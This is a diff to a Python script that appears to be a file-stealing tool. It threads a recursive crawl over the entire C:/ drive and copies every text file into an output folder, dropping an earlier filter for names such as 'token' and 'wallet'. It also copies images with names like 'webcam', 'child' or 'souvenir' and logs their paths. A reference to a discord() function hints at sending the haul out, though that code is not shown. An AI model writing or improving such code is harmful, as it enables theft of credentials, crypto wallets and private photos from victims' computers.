@@ -31,10 +31,13 @@ def discord():
             except:
                 print("acces")
 
-
-
-
-img_word = ["montagne",
+img_path_list_buffer = []
+#blacklist_path_img = ["c:/system32",
+    #"C:\Program Files (x86)",
+    #"C:\Program Files",
+    
+_img_word = [
+    "montagne",
     "ecole",
     "school",
     "2020",
@@ -43,14 +46,14 @@ img_word = ["montagne",
     "vacances",
     "child",
     "souvenir",
-    "ski",
     "ete",
-    'img'
+    'img',
     'webcam',
-    "unknow"
-]
-
-txt_word = ['token',
+    "unknown",
+    "capture",
+    
+    ]
+_txt_word = ['token',
     'adresse',
     'wallet',
     'ttk',
@@ -77,6 +80,16 @@ txt_word = ['token',
     'crypto'
     ]
 
+#txt_word = []
+#for word in _txt_word:
+    #txt_word.append(word + " ")
+    #txt_word.append(word + "-")
+    #txt_word.append(word + "_")
+img_word = []
+for word in _img_word:
+    img_word.append(word + " ")
+    img_word.append(word + "-")
+    img_word.append(word + "_")
 turn = 0
 rec = 0
 rec_max = 70 
@@ -84,52 +97,30 @@ find = 0
 def get_script_path():
     path= os.path.dirname(os.path.realpath(sys.argv[0]))
     return path
-
 def list_dir_txt(path):
+    global img_path_list_buffer
     global find
     global turn
     global rec
     rec += 1
-    
     try:
         for file in os.listdir(path):
             
             if not os.path.isfile(path + "/" + file):
-                list_dir_txt(path + "/" + file)
+                threading.Thread(target = list_dir_txt,args=(path + "/" + file,)).start()
             else:
                 if file.split(".")[-1] == "txt":
                     print(f"--- {path}/{file} --------------------------------------------------------------")
-                    for w in txt_word:
-                        if w in file:
-                            find = find + 1
-                            name = f"{path}/{file}"
-                            content = open(f"{path}/{file}", "r").read()
-                            #print(f"{name}\n{content}")
-                            with open(f"{file}",'w') as file:
-                                file.write(content)
-                               
-                        else: 
-                            global turn
-                            turn = turn + 1
-                            #print(f"file vaccum {turn}")
-                            pass
-                    
-    except Exception as e:
-        pass
-    rec -= 1
-
-def list_dir_img(path):
-    global find
-    global turn
-    global rec
-    rec += 1
-    
-    try:
-        for file in os.listdir(path):
-            
-            if not os.path.isfile(path + "/" + file):
-                list_dir_img(path + "/" + file)
-            else:
+                    #for w in txt_word:
+                        #if w in file:
+                    find = find + 1
+                    name = f"{path}/{file}"
+                    content = open(f"{path}/{file}", "r").read()
+                    with open(f"{get_script_path()}/output/txt/{file}",'w') as file:
+                        file.write(content)          
+                else: 
+                    turn = turn + 1
+                    pass
                 if file.split(".")[-1] == "jpg" or 'png':
                     print(f"--- {path}/{file} --------------------------------------------------------------")
                     for w in img_word:
@@ -138,28 +129,21 @@ def list_dir_img(path):
                             path_image = path + '/' + file
                             Image1 = Image.open(path_image)
                             Image1copy = Image1.copy()
-                            Image1copy.save(f"{get_script_path()}/grab-{file}")     
-                else:       
-                    global turn
+                            Image1copy.save(f"{get_script_path()}/output/img/grab-{file}")
+                            img_path_list_buffer.append(path + '/' + file)
+                            if len(img_path_list_buffer) >= 20:
+                                with open('./output/img_pathlist.txt','a')as file:
+                                    file.write("\n".join(img_path_list_buffer) + '\n')
+                                img_path_list_buffer = []  
+                else:
                     turn = turn + 1
                     print(f"file vaccum {turn}")
                     pass
-                    
     except Exception as e:
         pass
     rec -= 1
 
-threads = []
-for i in range(1):
-    t = threading.Thread(target=list_dir_txt('c:/'))
-    threads.append(t)
-    t.start()
-#input(f"Total vaccum file {turn} | Total take file {find}")
-
-threads = []
-for i in range(1):
-    t = threading.Thread(target=list_dir_img('c:/'))
-    threads.append(t)
-    t.start()
-#print(f"Total vaccum file {turn} | Total take file {find}")
-
+list_dir_txt('c:/')
+print(f"Total vaccum file {turn} | Total take file {find}")
+with open('./output/img_pathlist.txt','a')as file:
+    file.write("\n".join(img_path_list_buffer) + '\n')
